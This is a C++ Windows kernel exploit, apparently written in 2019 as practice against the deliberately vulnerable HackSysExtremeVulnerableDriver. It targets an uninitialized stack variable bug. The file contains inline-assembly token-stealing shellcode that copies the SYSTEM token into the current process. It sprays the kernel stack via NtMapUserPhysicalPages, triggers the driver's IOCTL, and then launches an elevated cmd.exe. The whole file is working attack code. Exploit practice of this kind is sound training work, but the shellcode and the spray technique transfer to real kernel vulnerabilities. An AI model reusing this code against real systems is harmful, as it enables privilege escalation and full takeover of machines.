// 6，未初始化内核栈漏洞利用.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"


#include <Windows.h>
#include <stdio.h>

HANDLE hDevice = NULL;

/************************************************************************/
/*                 Write by Thunder_J 2019.7                            */
/*               Uninitialized-Stack-Variable                           */
/************************************************************************/

typedef NTSTATUS(WINAPI * My_NtMapUserPhysicalPages)(
	IN PVOID          VirtualAddress,
	IN ULONG_PTR      NumberOfPages,
	IN OUT PULONG_PTR UserPfnArray);

VOID ShellCode()
{
	_asm
	{
		//int 3
			pushad;
			mov eax, fs: [124h];		// Find the _KTHREAD structure for the current thread
			mov eax, [eax + 0x150] ;  // Find the _EPROCESS structure
			mov ecx, eax;
			mov edx, 4;				// edx = system PID(4)

			// The loop is to get the _EPROCESS of the system
find_sys_pid :
			mov eax, [eax + 0xb8];	// Find the process activity list
			sub eax, 0xb8;    		// List traversal
			cmp[eax + 0xb4], edx ;   // Determine whether it is SYSTEM based on PID
			jnz find_sys_pid

			// Replace the Token
			mov edx, [eax + 0xf8];
			mov[ecx + 0xf8], edx;
			popad;
			//int 3
			//ret;
	}
}

BOOL init()
{
	// Get HANDLE
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	printf("[+]Start to get HANDLE...\n");
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		return FALSE;
	}
	printf("[+]Success to get HANDLE!\n");
	return TRUE;
}


static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}


VOID Trigger_shellcode()
{
	DWORD bRetur=0;
	DWORD32 buff=0xBAD0B0B0+1;
	
	My_NtMapUserPhysicalPages NtMapUserPhysicalPages=(My_NtMapUserPhysicalPages)GetProcAddress(GetModuleHandleW(L"ntdll"),"NtMapUserPhysicalPages");
	printf("My_NtMapUserPhysicalPages ： %x \n",NtMapUserPhysicalPages);

	PDWORD32 stackSprap=(PDWORD32)malloc(1024*4);
	memset(stackSprap,0,4096);
	for (int i=0;i<1024;i++)
	{
		*(stackSprap+i)=(DWORD32)&ShellCode;
	}
	NtMapUserPhysicalPages(NULL,1024,(PULONG_PTR)stackSprap);
	DeviceIoControl(hDevice,0x22202f,&buff,4,NULL,0,&bRetur,NULL);


}

int main()
{

	if (init() == FALSE)
	{
		printf("[+]Failed to get HANDLE!!!\n");
		system("pause");
		return 0;
	}

	Trigger_shellcode();

	printf("[+]Start to Create cmd...\n");
	CreateCmd();
	system("pause");

	return 0;
}